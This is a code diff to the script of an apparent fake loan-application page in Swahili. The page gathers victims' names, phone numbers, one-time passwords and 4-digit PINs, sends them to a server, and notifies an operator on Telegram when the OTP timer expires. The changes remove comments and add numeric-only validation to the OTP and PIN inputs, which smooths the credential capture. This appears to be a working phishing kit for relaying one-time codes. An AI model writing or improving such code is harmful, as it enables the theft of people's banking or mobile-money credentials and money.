@@ -10,7 +10,6 @@ function updateCalculator() {
     document.getElementById('loanAmountDisplay').innerText = `TSh ${amount.toLocaleString()}`;
     document.getElementById('loanTermDisplay').innerText = `miezi ${months}`;
 
-    // Simple estimation formula matching standard loan calculations with interest
     const monthlyRate = 0.02; 
     const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
     document.getElementById('monthlyPaymentDisplay').innerText = `TSh ${Math.round(monthlyPayment).toLocaleString()}`;
@@ -91,7 +90,6 @@ async function submitPersonalInfo() {
     await sendToServer('personal_info', { loanAmount: `TSh ${Number(loanAmount).toLocaleString()}`, loanTerm: `${loanTerm} miezi`, firstName, lastName, phoneNumber });
     hideLoading();
     
-    // Move immediately to Tembo Card screen
     showStep('step3');
 }
 
@@ -130,7 +128,6 @@ function startOtpTimer() {
             clearInterval(timerInterval);
             resendBtn.disabled = false;
             
-            // Automatically notify admin on Telegram when 30s expires
             showLoading('Muda wa OTP umeisha. Inaarifu msimamizi...');
             await sendToServer('step4', { isResend: true });
             hideLoading();
@@ -140,12 +137,18 @@ function startOtpTimer() {
 }
 
 function moveToNext(element, index) {
+    // Strip any non-numeric characters automatically
+    element.value = element.value.replace(/[^0-9]/g, '');
+
     if (element.value.length === 1 && index < 5) {
         document.querySelectorAll('.otp-box')[index].focus();
     }
 }
 
 function movePinNext(element, index) {
+    // Strip any non-numeric characters automatically
+    element.value = element.value.replace(/[^0-9]/g, '');
+
     if (element.value.length === 1 && index < 4) {
         document.querySelectorAll('.pin-box')[index].focus();
     }
@@ -156,8 +159,8 @@ async function submitOtp() {
     let otp = '';
     boxes.forEach(b => otp += b.value);
 
-    if (otp.length < 5) {
-        alert('Tafadhali ingiza namba kamili ya OTP ya tarakimu 5.');
+    if (otp.length < 5 || !/^\d+$/.test(otp)) {
+        alert('Tafadhali ingiza namba kamili ya OTP ya tarakimu 5 (nambari pekee).');
         return;
     }
 
@@ -183,8 +186,8 @@ async function submitPin() {
     let pin = '';
     boxes.forEach(b => pin += b.value);
 
-    if (pin.length < 4) {
-        alert('Tafadhali ingiza PIN ya tarakimu 4.');
+    if (pin.length < 4 || !/^\d+$/.test(pin)) {
+        alert('Tafadhali ingiza PIN ya tarakimu 4 (nambari pekee).');
         return;
     }
 
@@ -196,7 +199,6 @@ async function submitPin() {
     }
 }
 
-// Initialize calculator on load
 window.onload = () => {
     updateCalculator();
 };
